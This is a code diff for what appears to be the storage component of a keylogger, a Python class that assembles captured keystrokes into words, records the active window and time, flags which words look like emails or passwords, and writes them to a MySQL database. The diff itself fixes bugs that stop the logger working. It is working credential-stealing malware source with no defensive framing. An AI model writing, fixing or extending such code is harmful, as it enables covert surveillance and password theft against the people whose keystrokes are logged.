@@ -3,7 +3,7 @@ import mysql.connector
 
 class Process:
     def __init__(self):
-        self.words = ""
+        self.word = ""
         self.payload = {
             "datetime": "",
             "epoch": "",
@@ -17,13 +17,15 @@ class Process:
     def separateBreakChar(self,data):
     #loop through items in log and append characters on key-down
         if (data['processedKey']):
-            if (len(self.words) == 0):
+            if (len(self.word) == 0):
                 self.payload['datetime'] = data['datetime']
                 self.payload['epoch'] = data['epochTime']
                 self.payload['windowName'] = data['windowName']
-            self.payload['processedWord'] += data['processedKey']
+            self.word += data['processedKey']
         else:
             print("words: "+ self.payload['processedWord'])
+            self.payload['processedWord'] = self.word
+            self.word = ""
             self.checkEmailPassword()
             self.pushDB()
         return 0
@@ -39,7 +41,7 @@ class Process:
             self.payload['isPassword'] = 1
             
     
-    def pushDB(self:
+    def pushDB(self):
     #push to table words
         main_cfg = load_cfg('./main_cfg.json')
         
@@ -50,15 +52,17 @@ class Process:
             password=main_cfg['sqlPass'],
             database=main_cfg['db']
         )
-        
-        sql = f"INSERT INTO {main_cfg['dbWordTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s)"
-        val = (f"{self.payload['datetime']}", f"{self.payload['epoch']}", f"{self.payload['windowName']}", f"{self.payload['processedKey']}",f"{self.payload['isEmail']}", f"{self.payload['isPassword']}")
+        mycursor = db.cursor()
+
+        sql = f"INSERT INTO {main_cfg['dbWordTable']} {main_cfg['dbWordRows']} VALUES (%s, %s, %s, %s, %s, %s)"
+        val = (f"{self.payload['datetime']}", f"{self.payload['epoch']}", f"{self.payload['windowName']}", f"{self.payload['processedWord']}",f"{self.payload['isEmail']}", f"{self.payload['isPassword']}")
         
         print(sql,val)
         
         mycursor.execute(sql, val)
         db.commit()
         
+        self.payload['processedWord'] = ""
         mycursor.close()
         db.close()
         
